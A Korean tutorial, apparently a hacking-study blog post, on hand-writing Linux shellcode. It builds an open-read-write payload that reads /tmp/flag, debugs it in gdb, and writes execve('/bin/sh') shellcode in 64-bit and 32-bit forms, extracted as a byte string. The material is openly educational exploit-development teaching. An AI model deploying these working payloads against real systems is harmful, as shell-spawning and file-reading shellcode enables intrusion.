# Shellcode 작성하기

## 1. orw 셸코드 작성

<h3> 목표: "/tmp/flag"를 읽는 셸코드 작성해보기 🚩



#### 0) 의사코드로 작성해보기

```C
char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

작성한 의사코드를 토대로 orw 셸코드를 하나하나 적어보자.

<br />

#### 1) int fd = open("/tmp/flag", O_RDONLY, NULL)

*시스템콜 중 open()은 rax에는 0x02, rdi에는 경로문자열, rsi에는 flag, rdx에는 모드가 들어갑니다.*

1) "/tmp/flag" 문자열을 16진수 아스키코드로 변환한 뒤 스택에 push 합니다.
    
2) rdi 가 이를 가리키도록 rsp를 rdi로 옮깁니다.
    
3) O_RDONLY는 0이므로 rsi는 0으로 설정합니다.
    
4) 파일을 읽을 때 mode는 의미가 없으므로 rdx에는 0을 넣어줍니다.
    
5) rax는 open()의 syscall 값인 2로 설정합니다.
    

위의 과정을 셀코드로 적으면 아래와 같습니다.


```bash
push 0x67
mov rax, 0x616c662f706d742f 
push rax        ; rsp는 rax가 되었다
mov rdi, rsp    ; rdi = "/tmp/flag" (rsp를 rdi에 넣었기 때문)
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

<br />

#### 2) read(fd, buf, 0x30)

1) syscall의 반환값은 rax로 저장됩니다-> 위에서 open으로 획득한 /tmp/flag의 fd 는 rax에 저장되어있습니다.

2) read의 첫 번째 인자는 이 값이어야 하므로 rax를 rdi에 저장합니다.

3) rsi는 파일에서 읽은 데이터를 저장할 주소를 가리키는데, 0x30만큼 데이터를 읽어오므로 rsi = rsp-0x30 을 대입합니다.

4) rdx는 파일로부터 읽어낼 데이터의 길이이므로 rdx = 0x30 을 대입합니다.


위의 과정을 셸코드로 적으면 아래와 같습니다.


```bash
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall         ; read(fd, buf, 0x30)
```

<br />

#### 3) write(1, buf, 0x30)

1) 출력은 표준출력(stdout)을 사용할 것이므로, rdi를 0x1로 설정합니다.

2) 출력할 내용을 담고 있는 buf를 그대로 이용할 것이기 때문에, 2번 read()에서 사용한 buf인 rsi를 그대로 사용해도 괜찮습니다.

3) 출력할 길이는 똑같이 0x30 이기 때문에, 2번 read()에서 사용한 rdx를 그대로 사용해도 괜찮습니다.

4) write는 1번 시스템콜이므로 rax에 0x1을 넣어줍니다.


위의 과정을 셸코드로 적으면 아래와 같습니다.


```bash
mov rdi, 0x1
mov rax, 0x1
syscall
```

<br />

#### 4) 전체 셸코드

```bash
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

<br />

#### 5) orw 셸코드 컴파일 및 실행

셸코드를 실행할 수 있는 스켈레톤 코드를 C언어로 작성한 뒤, 그 곳에 셸코드를 작성하는 것으로 진행합니다.

*스켈레톤 코드란?: 핵심 내용이 비어있는, 기본 구조만 갖춘 코드를 말한다.*

```C
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");
void run_sh();
int main() { run_sh(); }
```

위에서 적은 C 코드를 orw.c로 저장한 뒤, gcc로 컴파일하여 실행해봅시다. (tmp 폴더에 flag 가 있어야 함!)

```bash
gcc -o orw orw.c -masm=intel
./orw
```

정상적으로 flag 값이 나오는 것을 볼 수 있습니다.

> Q. 왜 끝에 이상한 문자가 나오나요?


> A. 읽어오는 버퍼의 크기를 0x30으로 해두었기 때문에, 실제로 flag 파일 내부의 내용 길이가 0x30보다 작다면 초기화되지 않은 메모리 영역 부분을 출력하게 되고, 결론적으로는 쓰레기값을 출력하게 됩니다.

<br />

## 2. orw 셸코드 디버깅

<h3> 목표: "/tmp/flag"를 읽는 셸코드 동작을 자세히 분석하기 🚩


#### 1) orw를 gdb로 연 뒤, run_sh()에 브레이크 포인트를 설정한다

```bash
b *run_sh
r
```

작성한 셸코드인 run_sh에 rip가 위치하면 정상적으로 진행된 것!

<br />

#### 2) int fd = open("/tmp/flag", O_RDONLY, NULL)

첫번째 syscall 인 open가 위치한 run_sh+29에 break point를 걸어, 각 레지스터를 확인함으로써 인자를 검사해봅시다.

```bash
b *run_sh + 29
r
```

의도한대로, rax에는 3, rdi에는 경로, rsi에는 0, rdx에는 0이 있으면 정답입니다.

rax에는 open을 한 결과가 저장되므로, 파일 디스크립터 값이 들어가있게 됩니다. 일반적으로 3이 들어가있습니다.

0, 1, 2 는 표준 입출력과 오류가 있으므로 그 다음 숫자인 3부터 할당해주기 때문입니다.


<br />

#### 3) read(fd, buf, 0x30)

두번째 syscall 인 read가 위치한 run_sh+55에 break point를 걸어, 각 레지스터를 확인함으로써 인자를 검사해봅시다.

```bash
b *run_sh + 55
c
```

이런 과정을 이용하여 write()까지 디버깅을 하면 됩니다.

<br />

## 3. execve 셸코드

셸이란 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스입니다.

따라서 셸을 획득하면 시스템을 제어할 수 있기 때문에, 셸 획득을 시스템 해킹의 성공으로 여기게 됩니다.

#### 1) execve("/bin/sh", null, null)

**execve 셸코드는 execve 시스템 콜로만 구성됩니다.**

함수형태: execve(const char *filename, const char *argv, const char *envp) 

argv는 실행파일에 필요한 인자, envp는 환경변수이지만 우리는 sh를 실행만 하면 되기 때문에, 다른 값은 null 로 설정하고 /bin/sh만 제대로 넘겨주면 됩니다.

```bash
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

#### 2) execve 셸코드 컴파일 및 실행

스켈레톤 코드를 이용하여 execve 셸코드 컴파일링

```bash
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp  # rdi = '/bin/sh'\n"
    "xor rsi, rsi  # rsi = NULL\n"
    "xor rdx, rdx  # rdx = NULL\n"
    "mov rax, 0x3b # rax = sys_execve\n"
    "syscall       # execve('/bin/sh', null, null)\n"
    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");
void run_sh();
int main() { run_sh(); }
```

#### 3) objdump 를 이용한 shellcode 추출

<br />

```bash
; File name: shellcode.asm
section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```

<br />

objdump를 이용하여 shellcode를 추출하기 위해서 최초로 apt-get install nasm을 실행해줘야 합니다.

```bash
$ sudo apt-get install nasm 
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
```

결과물은 아래와 같습니다.

```bash
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
$ 
```

위에서 만든 .o 파일을 이용하여 셸코드를 추출합니다.


```bash
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
$ 
execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```
